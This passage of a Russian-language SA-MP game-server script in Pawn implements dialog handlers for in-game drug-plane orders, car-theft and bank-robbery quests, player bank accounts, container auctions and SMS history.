			        ShowPlayerDialog(playerid,493,DIALOG_STYLE_MSGBOX,"Заказать самолет","{ffffff}Действительно ли Вы хотите заказать самолет с наркотиками?\n\nВместимость самолета: {f7ae11}20 ящиков (10000 грамм){ffffff}\n\nЦена: {f7ae11}50000$","Далее","Отмена");
			    }
			    case 2: ShowPlayerDialog(playerid,499,DIALOG_STYLE_LIST,"Ограбление банка","1 | Los Santos\n2 | Las Venturas","Далее","Отмена");
				case 3:
				{
				    DeletePVar(playerid,"GrabQuestW");
					DeletePVar(playerid,"GrabQuest");
					SendClientMessage(playerid,CREWARD,"Вы выполнили задание!");
					PlayerInfo[playerid][pGrabQuest]++;
					BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][1] = 2;
				}
			}
			
		}
		case 493:
		{
		    if(!response) return 1;
		    new h,m,c;
			gettime(h,m,c);
			if(h < 10 || h > 22) return SendClientMessage(playerid,CGREY,"Заказать самолет можно с 10:00 до 22:00");
		    if(FracBank[PlayerInfo[playerid][pMember]] < 50000) return SendClientMessage(playerid,CGREY,"Недостаточно средств в общаке мафии!");
		    if(PlaneCount > 3) return SendClientMessage(playerid,CGREY,"Самолет закан уже 3 раза!");
		    if(PlaneTime > gettime()) return SendClientMessage(playerid,CGREY,"Самолет можно заказывать раз 3 часа!");
		    PlaneTime = gettime()+60*60*3;
		    PlaneCount++;
		    FracBank[PlayerInfo[playerid][pMember]] -= 50000;
		    SaveBank(playerid);
		    static const fmt_string[] = "[F] %s заказал самолет с наркотиками. На складе: %i$";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracBank[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
		    
		}
		case 494:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pCRT] > gettime())
	 		{
	 		    SayBot("Я уже давал тебе заказ в этом часу",-1,RobBot,RobText);
	 			return SendClientMessage(playerid,CGREY,"Заказа можно брать раз в час!");
			}
		    if(PlayerInfo[playerid][pCRL] > listitem)
			{
			    SayBot("Ты уже выполнил все заказы этого класса",-1,RobBot,RobText);
				return SendClientMessage(playerid,CGREY,"Вы уже выполнили заказы этого уровня!");
			}
		    new i = GetIDRC();
			if(i == -1) return SendClientMessage(playerid,CGREY,"Сейчас нет заказов!");
		    DestroyVehicle(CarRob[i]);
	        CarRob[i] = CreateVehicle(CarRobIDs[listitem][random(4)],CarRobPos[i][0],CarRobPos[i][1],CarRobPos[i][2],CarRobPos[i][3],-1,-1,60);
	        SetVehicleVirtualWorld(CarRob[i],0);
	        IsLocked[CarRob[i]] = true;
       		CarDoors(CarRob[i],1);
       		Fuel[CarRob[i]] = 100;
	        PlayerInfo[playerid][pCRT] = gettime()+60*60;
            SendClientMessage(playerid,CGREEN,"На карте отмечена зона (ярко-красная), где находится нужный транспорт!");
            SendClientMessage(playerid,-1,"Для взлома транспорта используйте: {f7ae11}/hack");
            GangZoneShowForPlayer(playerid,CarRobGz[i],0xFF0000AA);
            SetPVarInt(playerid,"CarRob",i+1);
            SetPVarInt(playerid,"CarRobW",1);
            SetPVarInt(playerid,"RobCarTime",gettime());
            SayBot("Давай по-тихому!",-1,RobBot,RobText);

		}
		case 495:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			if(GetFree(playerid,458,1))
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
			}
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
            PlayerInfo[playerid][pOtm]++;
			GiveInv(playerid,458,1);
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			SendClientMessage(playerid,CREWARD,"Вы приобрели отымчку.");
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
		case 496:
		{
			if(!response) return cmd_menu(playerid,"");
			new str[70];
			query = "";
			SetPVarInt(playerid,"QuestList",listitem);
			switch(listitem)
			{
			    case 0:
			    {
			        for(new i = 0; i < 9; i++)
			        {
			            format(str,sizeof(str),"%d | %s\t%s\n",i+1,QuestInfo[i][qName],(!PlayerInfo[playerid][pQuestS][i]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}"));
						strcat(query,str);
					}
					ShowPlayerDialog(playerid,497,DIALOG_STYLE_TABLIST,"Основная линия",query,"Далее","Отмена");
			    }
			    case 1:
			    {
			        for(new i = 9; i < 15; i++)
			        {
			            format(str,sizeof(str),"%d | %s\t%s\n",i-8,QuestInfo[i][qName],(!PlayerInfo[playerid][pQuestS][i]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}"));
						strcat(query,str);
					}
					ShowPlayerDialog(playerid,497,DIALOG_STYLE_TABLIST,"Нелегальные организации",query,"Далее","Отмена");
			    }
			    case 2:
			    {
			        for(new i = 15; i < 20; i++)
			        {
			            format(str,sizeof(str),"%d | %s\t%s\n",i-14,QuestInfo[i][qName],(!PlayerInfo[playerid][pQuestS][i]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}"));
						strcat(query,str);
					}
					ShowPlayerDialog(playerid,497,DIALOG_STYLE_TABLIST,"Государственные организации",query,"Далее","Отмена");
			    }
			}
		}
		case 497:
		{
		    if(!response) return DeletePVar(playerid,"QuestList");
		    new i;
		    if(!GetPVarInt(playerid,"QuestList")) i = listitem;
		    else if(GetPVarInt(playerid,"QuestList") == 1) i = listitem+9;
		    else if(GetPVarInt(playerid,"QuestList") == 2) i = listitem+15;
		    query = "";
			switch(i)
			{
			    case 0: format(query,sizeof(query),QuestInfo[i][qInfo],(PlayerInfo[playerid][pPass]) ? ("[Есть]") : ("[Нет]"),(PlayerInfo[playerid][pBankPin]) ? ("[Есть]") : ("[Нет]"));
				case 1: format(query,sizeof(query),QuestInfo[i][qInfo],PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1],PlayerQuest[playerid][i][2],PlayerQuest[playerid][i][3]);
				case 2: format(query,sizeof(query),QuestInfo[i][qInfo],(PlayerInfo[playerid][pPhone]) ? ("[Есть]") : ("[Нет]"),(PlayerInfo[playerid][pAcs][2]) ? ("[Есть]") : ("[Нет]"));
				case 3,5,6,7,8,9,10,12: format(query,sizeof(query),QuestInfo[i][qInfo],(PlayerQuest[playerid][i][0]) ? ("[Есть]") : ("[Нет]"));
				case 4: format(query,sizeof(query),QuestInfo[i][qInfo],PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1],PlayerQuest[playerid][i][2],(PlayerQuest[playerid][i][3]) ? ("[Есть]") : ("[Нет]"),PlayerQuest[playerid][i][4],PlayerQuest[playerid][i][5]);
                case 11,15..19: format(query,sizeof(query),QuestInfo[i][qInfo],PlayerQuest[playerid][i][0]);
                case 13: format(query,sizeof(query),QuestInfo[i][qInfo],PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1]);
			}
		    ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,QuestInfo[i][qName],query,"Далее","");
		    DeletePVar(playerid,"QuestList");
		}
		case 498:
		{
		    if(!response) return 1;
		    new str[90];
		    switch(listitem)
		    {
		        case 0:
		        {
					query = "";
					for(new i = 1; i <= TOTALFRAC; i++)
					{
					    if(i == 3) continue;
						format(str,sizeof(str),"%i | %s\n",(i	> 2) ? (i+1):(i),FracInfo[i][fName]);
						strcat(query, str);
					}
					ShowPlayerDialog(playerid,453,DIALOG_STYLE_LIST,"Выберите организацию",query,"Далее","Отмена");
		        }
		        case 1:
		        {
					query = "{F85A5A}1 | Снять форму\n";
					for(new i = 1; i <= TOTALFRAC; i++)
					{
						if(i == 3) continue;
						format(str,sizeof(str),"%i | %s\n",(i > 2) ? (i+2):(i+1),FracInfo[i][fName]);
						strcat(query, str);
					}
					ShowPlayerDialog(playerid,454,DIALOG_STYLE_LIST,"Выберите организацию",query,"Далее","Отмена");
		        }
		    }
		}
		case 499:
		{
		    if(!response) return 1;
		    SetPVarInt(playerid,"GrabTown",listitem+1);
			if(listitem) SetPlayerRaceCheckpoint(playerid,2,2473.08,2243.6,10.8203,0,0,0,1); //mayor
			else SetPlayerRaceCheckpoint(playerid,2,1485.86,-1011.7,26.8438,0,0,0,1);
			SetPVarInt(playerid,"GPS",1);
			SendClientMessage(playerid,CREWARD,"Договоритесь с кассиршой, чтобы она дала информацию о банке!");
		}
		
		case 500:
		{
		    if(!response) return 1;
		    new i = PlayerInfo[playerid][pGrabTeam];
		    query = "";
		    switch(listitem)
		    {
		        case 0:
		        {
					format(query, sizeof(query), "SELECT * FROM accounts WHERE pGrabTeam = '%d'", i);
					mysql_tquery(mysql, query, "ShowBands","dd",playerid,i);
		        }
		        case 1:
		        {
					
					format(query,sizeof(query),"1 | Довориться с кассиршой\t%s\n2 | Украсть устройство для подробра паролей + Купить бомбу\t%s\n\
					3 | Фотографии здании банка\t%s\n4 | Украсть полицейскую форму\t%s\n5 | Ограбление\t%s",(!BankGrab[i][bQuest][0]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}")
					,(!BankGrab[i][bQuest][1]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}")
					,(!BankGrab[i][bQuest][2]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}")
					,(!BankGrab[i][bQuest][3]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}")
					,(!BankGrab[i][bQuest][4]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ("{20BA09}[Выполнен]{FFFFFF}"));
					ShowPlayerDialog(playerid,501,DIALOG_STYLE_TABLIST,"Задания",query,"Далее","Отмена");
		        }
		    }
		}
		case 501:
		{
		    if(!response) return 1;
		    new i = PlayerInfo[playerid][pGrabTeam],kek;
		    /*for(new x = 0; x < 3; i++)
		    {
		        if(BankGrab[i][bPlayer][x]) continue;
		        kek++;
		    }
		    if(kek < 3) return SendClientMessage(playerid,CGREY,"Нельзя выполнять задания не назначив подельников!");*/
		    if(BankGrab[i][bQuest][listitem] == 2) return SendClientMessage(playerid,CGREY,"Задание уже выполнено!");
		    if(BankGrab[i][bQuest][listitem] == 1) return SendClientMessage(playerid,CGREY,"Задание выполняется другим игроком!");


			
			if(!GetPVarInt(playerid,"GrabQuest"))
			{
			    SetPVarInt(playerid,"GrabQuest",listitem);
			    DeletePVar(playerid,"GrabQuestW");
			   // new band = PlayerInfo[playerid][pGrabTeam];
			    switch(listitem)
			    {
			        case 1:
			        {
			            SendClientMessage(playerid,CREWARD,"Украдите устройство для подробра паролей!");
						SetPlayerRaceCheckpoint(playerid,2,353.5841,1923.5765,17.6406,0,0,0,1);
						SetPVarInt(playerid,"GPS",1);
						BankGrab[i][bQuest][1] = 1;
			        }
			        case 2:
			        {
			            if(BankGrab[i][bTimes] > gettime())
			            {
                        	static const fmt_str[] = "Вас заметила камера наблюдения. Выполнить задание можно будет через: %s";
							new string[sizeof(fmt_str)+10];
							format(string, sizeof(string), fmt_str, timec(BankGrab[i][bTimes]));
							return SendClientMessage(playerid,CGREY,string);
						}
						SendClientMessage(playerid,CREWARD,"Купите фотоаппарат в 24/7 и сфотографируйте здание банка");
						if(!BankGrab[i][bTown]) SetPlayerRaceCheckpoint(playerid,2,PhotoPosLS[0][0],PhotoPosLS[0][1],PhotoPosLS[0][2],0,0,0,1);
						else SetPlayerRaceCheckpoint(playerid,2,PhotoPosLV[0][0],PhotoPosLV[0][1],PhotoPosLV[0][2],0,0,0,1);
						SetPVarInt(playerid,"GPS",1);
						BankGrab[i][bQuest][2] = 1;
			        }
			        case 3:
			        {
			            BankGrab[i][bQuest][3] = 1;
			            SendClientMessage(playerid,CREWARD,"Украдите форму из близайшего полицейского участка");
			        }
			        case 4:
			        {
			            
			            new h,m,c;
						gettime(h,m,c);
						if(h < 12 || h > 23) return SendClientMessage(playerid,CGREY,"Захват территорий происходит с 12:00 до 23:00");
			            if(BankHack[BankGrab[i][bTown]][bTime] > gettime()) return SendClientMessage(playerid,CGREY,"Грабить банк можно раз 3 часа!");
			            BankHack[BankGrab[i][bTown]][bTime] = gettime()+60*60*3;
			            SendClientMessage(playerid,CREWARD,"Арендуйте транспорт для грабежа! Аренду транспорт можно найти в GPS");
			            BankGrab[i][bGrab] = 1;
			            BankGrab[i][bQuest][4] = 1;
			        }
			    }
			}
		}
		case 502:
		{
		    if(!response) return 1;
		    if(!listitem) return 1;
		    new i = PlayerInfo[playerid][pGrabTeam];
		    if(BankGrab[i][bPlayer][listitem-1]) return SendClientMessage(playerid,CGREY,"В этом слоте уже есть подельник!");
		    SetPVarInt(playerid,"PodSlot",listitem-1);
		    ShowPlayerDialog(playerid,503,DIALOG_STYLE_INPUT,"Добавить подельника","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
		}
		case 503:
		{
		    if(!response) return DeletePVar(playerid,"PodSlot");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,503,DIALOG_STYLE_INPUT,"Добавить подельника","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
		    new player = strval(inputtext);
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(player,x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		    if(GetPred(player) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку поучаствовать в ограблении");
   			static const fmt_string1[] = "%s предложил Вам поучаствовать в ограблении";
			new str1[sizeof(fmt_string1)+24];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
			SendClientMessage(player,0xFF7F50FF,str1);
			SendClientMessage(player,CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(player,"PodID",playerid);
			SetPVarInt(player,"Pod",1);
			SetPVarInt(player,"PodSlot",GetPVarInt(playerid,"PodSlot"));
   			DeletePVar(playerid,"PodSlot");
		}
		case 504:
		{
		    if(!response) return 1;
		    DeletePVar(playerid,"GrabQuestW");
			DeletePVar(playerid,"GrabQuest");
			SendClientMessage(playerid,CREWARD,"Вы выполнили задание!");
			PlayerInfo[playerid][pGrabQuest]++;
			BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][1] = 2;
		}
	}
	return 1;
}








stock CheckQuest(playerid,i)
{
	if(PlayerInfo[playerid][pQuestS][i]) return 1;
	new full;
	switch(i)
	{
	    case 0: if(PlayerInfo[playerid][pPass] && PlayerInfo[playerid][pBankPin]) full++;
	    case 1: if(PlayerQuest[playerid][i][0] >= 10 && PlayerQuest[playerid][i][1] >= 10 && PlayerQuest[playerid][i][2] >= 10 && PlayerQuest[playerid][i][3] >= 10) full++;
		case 2: if(PlayerInfo[playerid][pPhone] && PlayerInfo[playerid][pAcs][2]) full++;
		case 3,5,6,7,8,9,10,12: if(PlayerQuest[playerid][i][0]) full++;
		case 4: if(PlayerQuest[playerid][i][0] >= 5 && PlayerQuest[playerid][i][1] >= 3 && PlayerQuest[playerid][i][2] && PlayerQuest[playerid][i][3] >= 15 && PlayerQuest[playerid][i][4] >= 3) full++;
		case 11: if(PlayerQuest[playerid][i][0] >= 10) full++;
		case 13: if(PlayerQuest[playerid][i][0] >= 3000 && PlayerQuest[playerid][i][0] >= 3000) full++;
		case 14,15,19: if(PlayerQuest[playerid][i][0] >= 5) full++;
		case 16,18: if(PlayerQuest[playerid][i][0] >= 3) full++;
		case 17: if(PlayerQuest[playerid][i][0] >= 10) full++;
	}
	if(full)
	{
	    PlayerInfo[playerid][pQuestS][i] = 1;
	    new str[144];
	    format(str,sizeof(str),"Поздравляем! Вы выполнили квест '%s'!",QuestInfo[i][qName]);
	    SendClientMessage(playerid,CREWARD,str);
	    str = "";
	    format(str,sizeof(str),"Награда: %d$ и %d EXP",QuestInfo[i][qMoney],QuestInfo[i][qExp]);
	    SendClientMessage(playerid,CREWARD,str);
	    GiveMoney(playerid,QuestInfo[i][qMoney]);
	    PlayerInfo[playerid][pExp] += QuestInfo[i][qExp];
	    CheckLVL(playerid);
	}
	return 1;
}
function CheckPlayerContainer(playerid,stavka)
{
	new str[120];
    if(cache_get_row_count(mysql)>0)
	{
//        new st = cache_get_field_content_int(0, "stavka", mysql);
/*        if(st > stavka)
        {
            ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
            return SendClientMessage(playerid,CGREY,"Нельзя поставить ставку меньше действующей!");
        }*/
        if(GetPVarInt(playerid,"ContW") < 4) GiveMoney(playerid,-stavka);
        else if(GetPVarInt(playerid,"ContW") >= 4) PlayerInfo[playerid][pDonate] -= stavka;
        
        query = "";
		format(query,sizeof(query),"UPDATE `containers` SET `stavka` = '%d' WHERE container = '%d' AND idacc = '%d' LIMIT 1",stavka,GetPVarInt(playerid,"ContW"),PlayerInfo[playerid][pID]);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,CREWARD,"Новая ставка успешно установлена!");
       	format(str,sizeof(str),"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}%d%s",stavka,(GetPVarInt(playerid,"ContW") < 4) ? ("$") : (" Donate Points"));
		UpdateDynamic3DTextLabelText(ContText[GetPVarInt(playerid,"ContW")],-1,str);
		MaxBet[GetPVarInt(playerid,"ContW")] = stavka;
		query = "";
		format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' ORDER BY `stavka` DESC LIMIT 5",GetPVarInt(playerid,"ContW"));
		mysql_tquery(mysql, query, "CheckContainer", "d", playerid);
    }
    else
    {
        if(GetPVarInt(playerid,"ContW") < 4) GiveMoney(playerid,-stavka);
        else if(GetPVarInt(playerid,"ContW") >= 4) PlayerInfo[playerid][pDonate] -= stavka;
        query = "";
		format(query, sizeof(query), "INSERT INTO containers (container,idacc,stavka,name) VALUES ('%d','%d','%d','%s')", GetPVarInt(playerid,"ContW"),PlayerInfo[playerid][pID],
		stavka,PlayerInfo[playerid][pSendername]);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,CREWARD,"Cтавка успешно установлена!");
		format(str,sizeof(str),"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}%d%s",stavka,(GetPVarInt(playerid,"ContW") < 4) ? ("$") : (" Donate Points"));
		UpdateDynamic3DTextLabelText(ContText[GetPVarInt(playerid,"ContW")],-1,str);
		MaxBet[GetPVarInt(playerid,"ContW")] = stavka;
		query = "";
		format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' ORDER BY `stavka` DESC LIMIT 5",GetPVarInt(playerid,"ContW"));
		mysql_tquery(mysql, query, "CheckContainer", "d", playerid);
    }
    SetPVarInt(playerid,"NonFlood1",gettime()+3);
    return 1;
}
stock CheckAcs(playerid,i,acs,tdid)
{
    for(new x = 0; x < 6; x++) PlayerTextDrawHide(playerid,ActionInventoryP[x][playerid]);
    DeletePVar(playerid,"SetCehck");
    PlayerTextDrawHide(playerid,InventoryP[i+6][playerid]);
    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i+6][playerid], InvType[InvInfo[playerid][iSlot][i]][invObj]);
    PlayerTextDrawBackgroundColor(playerid, InventoryP[i+6][playerid], 589505535);
	PlayerTextDrawSetPreviewRot(playerid, InventoryP[i+6][playerid], InvType[InvInfo[playerid][iSlot][i]][invRot][0], InvType[InvInfo[playerid][iSlot][i]][invRot][1], InvType[InvInfo[playerid][iSlot][i]][invRot][2], InvType[InvInfo[playerid][iSlot][i]][invRot][3]);
    PlayerTextDrawShow(playerid,InventoryP[i+6][playerid]);
   // PlayerTextDrawHide(playerid,InvAmm[i+6][playerid]);
    
	new acsid = GiveID(acs);
    PlayerTextDrawHide(playerid,InventoryP[tdid][playerid]);
    PlayerTextDrawSetPreviewModel(playerid, InventoryP[tdid][playerid], acs);
	PlayerTextDrawSetPreviewRot(playerid, InventoryP[tdid][playerid], InvType[acsid][invRot][0], InvType[acsid][invRot][1], InvType[acsid][invRot][2], InvType[acsid][invRot][3]);
    PlayerTextDrawShow(playerid,InventoryP[tdid][playerid]);
    return 1;

}
stock PerevodEx(playerid,schet1,schet2,cash)
{
	if(!schet1) PlayerInfo[playerid][pBank] -= cash;
	else BanksInfo[playerid][bankCash][schet1] -= cash;
	if(!schet2) PlayerInfo[playerid][pBank] += cash;
	else BanksInfo[playerid][bankCash][schet1] += cash;

	SetPlayerInt(PlayerInfo[playerid][pSendername],"bank",PlayerInfo[playerid][pBank]);
	query = "";
	format(query,sizeof(query),"UPDATE `banks` SET `cash` = '%d' WHERE id = '%d' LIMIT 1",BanksInfo[schet1][bankCash], schet1);
	mysql_tquery(mysql,query);
	DeletePVar(playerid,"Schet");
	DeletePVar(playerid,"SchetZ");
	new str1[144];
//	format(str1, sizeof(str1), "[BANK] {ffffff}Вы перевели %d$ со счета \"%s\" на счет \"%s\"",cash,(!schet1) ? ("Основной"):(BanksInfo[playerid][bankName][schet1]),(!schet2) ? ("Основной"):(BanksInfo[playerid][bankName][schet2]));
	//(!s1) ? ("Основной") : (BanksInfo[playerid][bankName][s1]),(!s2) ? ("Основной") : (BanksInfo[playerid][bankName][s2]
	
	// 
 	format(str1, sizeof(str1), "[BANK] {ffffff}Вы перевели %d$ со счета \"%s\" на счет \"%s\"",cash,(!schet1) ? ("Основной") : (BanksName[playerid][schet1]),(!schet2) ? ("Основной") : (BanksName[playerid][schet2]));
	SendClientMessage(playerid,CREWARD,str1);

	return 1;
}
function DeleteBanks1(playerid)
{
    if(cache_get_row_count(mysql)>0)
    {
        query = "";
		new cash = cache_get_field_content_int(0, "cash", mysql);
		new name[64];
		cache_get_field_content(0, "name", name, mysql);
		if(cash) PlayerInfo[playerid][pBank] += cash;
		static const fmt_string[] = "[BANK] {ffffff}Вы удалили счет \"%s\"";
		new str1[sizeof(fmt_string)+62];
		format(str1, sizeof(str1), fmt_string,name);
		SendClientMessage(playerid,CREWARD,str1);
		format(query, sizeof(query), "DELETE FROM banks WHERE id = '%d' AND idacc = '%d'", GetPVarInt(playerid,"Schet"), PlayerInfo[playerid][pID]);
		mysql_tquery(mysql,query);
		DeletePVar(playerid,"Schet");
    }
    return 1;
}
function DeleteBanks(playerid)
{
    if(cache_get_row_count(mysql)>0)
    {
		new name[64];
		cache_get_field_content(0, "name", name, mysql);
        static const fmt_string[] = "{ffffff}Вы действительно хотите удалить счет \"%s\"?\n\n{F85A5A}\t- Отменить данное действите будет невозможно\n\t- Все деньги с этого счета будут переведены на \"Основной\"";
		new str1[sizeof(fmt_string)+62];
		format(str1, sizeof(str1), fmt_string,name);
		ShowPlayerDialog(playerid,436,DIALOG_STYLE_LIST,"Банковские счета",str1,"Далее","Отмена");
    }
    return 1;
}
function ShowBanksPer(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
		new cash,name[64],kek,str[64];
	 	format(str,sizeof(str),"{A8EFFF}Основной: %d${ffffff}\n",PlayerInfo[playerid][pBank]);
		strcat(query, str);
		for(new row = 1; row<= rows; row++)
		{
			cache_get_field_content(row-1, "name", name, mysql);
			cash = cache_get_field_content_int(row-1, "cash", mysql);
			format(str,sizeof(str),"%s: %d\n",name,cash);
			strcat(query, str);
			ListNick[playerid][kek] = cache_get_field_content_int(row-1, "id", mysql);
			kek++;
		}
		ShowPlayerDialog(playerid,437,DIALOG_STYLE_LIST,"Cчет зачисления",query,"Далее","Отмена");
	}
	else SendClientMessage(playerid,CGREY,"У Вас нет других счетов");
	return 1;
}
/*function ShowBanks(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
		new cash,name[64],kek;
	 	format(str,sizeof(str),"{20BA09}Открыть новый счет\n{A8EFFF}Основной: %d${ffffff}\n",PlayerInfo[playerid][pBank]);
		strcat(query, str);
		for(new row = 1; row<= rows; row++)
		{
			cache_get_field_content(row-1, "name", name, mysql);
			cash = cache_get_field_content_int(row-1, "cash", mysql);
			format(str,sizeof(str),"%s: %d\n",name,cash);
			strcat(query, str);
			ListNick[playerid][kek] = cache_get_field_content_int(row-1, "id", mysql);
			kek++;
		}
		ShowPlayerDialog(playerid,433,DIALOG_STYLE_LIST,"Банковские счета",string1,"Далее","Отмена");
	}
	else
	{
	    static const fmt_str1[] = "{20BA09}Открыть новый счет\n{A8EFFF}Основной: %d$";
		new string1[sizeof(fmt_str1)+5];
		format(string1, sizeof(string1), fmt_str1, PlayerInfo[playerid][pBank]);
		ShowPlayerDialog(playerid,433,DIALOG_STYLE_LIST,"Банковские счета",string1,"Далее","Отмена");
	}
	return 1;
}*/
function ShowAlist1(playerid)
{
	if(cache_get_row_count(mysql)>0)
    {
		new kolwarn = cache_get_field_content_int(0, "KolWarn", mysql);
		new kolban = cache_get_field_content_int(0, "KolBan", mysql);
		new koljail = cache_get_field_content_int(0, "KolJail", mysql);
		new kolans = cache_get_field_content_int(0, "KolAns", mysql);
		new kolmute = cache_get_field_content_int(0, "KolMute", mysql);
		new name[24];
		cache_get_field_content(0, "name", name, mysql);
		SetPVarString(playerid,"AdminID",name);
		static const fmt_string2[] = "Всего действий:\t%d\nКоличество /jail:\t%d\nКоличество /warn:\t%d\nКоличество /ban:\t%d\nКоличество /mute:\t%d\nКоличество /ans:\t%d";
		new str2[sizeof(fmt_string2)+3*6];
		format(str2, sizeof(str2), fmt_string2,kolwarn+kolban+koljail+kolans+kolmute,koljail,kolwarn,kolban,kolmute,kolans);
		ShowPlayerDialog(playerid,432,DIALOG_STYLE_TABLIST,name,str2,"Очистить","Отмена");
    }
    else DeletePVar(playerid,"AdminID");
	return 1;
}
function ShowAllSMS(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
		new year, month, day, hour, minute, second,kek;
		new str[70],sos[24],sos1[24];
		for(new row = 1; row<= rows; row++)
		{
		    TimestampToDate(cache_get_field_content_int(row-1, "time", mysql), year, month, day, hour, minute, second,0);
			cache_get_field_content(row-1, "id1", sos, mysql);
			cache_get_field_content(row-1, "id2", sos1, mysql);
			format(str,sizeof(str),"{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] {f7ae11}%s{ffffff} %s \n",day,month,year,hour, minute, second,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? ("к") : ("от"),(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos));
			strcat(query, str);
			ListNick[playerid][kek] = cache_get_field_content_int(row-1, "id", mysql);
			kek++;
		}
		ShowPlayerDialog(playerid,419,DIALOG_STYLE_LIST,"Сообщение",query,"Далее","Отмена");
	}
	else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Сообщение","{ffffff}Сообщений нет!","Закрыть","");
	return 1;
}
stock ShowSMS(playerid)
{
    query = "";
    format(query, sizeof(query), "SELECT * FROM phonesms WHERE (id1 = '%s' OR id2 = '%s') AND type = '0' LIMIT 20",PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql, query, "ShowAllSMS", "d", playerid);
 /*   format(query, sizeof(query), "SELECT * FROM phonesms WHERE (id1 = '%s' OR id2 = '%s') AND type = '0'",PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pSendername]);
